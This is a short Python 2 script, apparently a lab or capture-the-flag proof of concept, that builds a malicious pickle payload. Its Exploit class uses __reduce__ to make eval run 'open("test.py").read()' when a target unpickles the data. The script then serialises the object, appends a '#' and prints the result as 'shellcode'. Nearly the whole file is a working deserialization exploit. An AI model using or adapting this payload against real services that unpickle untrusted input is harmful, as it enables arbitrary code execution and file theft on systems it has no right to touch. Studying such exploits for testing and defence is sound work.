from pickle import dumps

# Exploit that we want the target to unpickle
class Exploit(object):
    def __reduce__(self):
        return (eval, ('open("test.py").read()',))

shellcode = dumps(Exploit()) + '#'
print shellcode
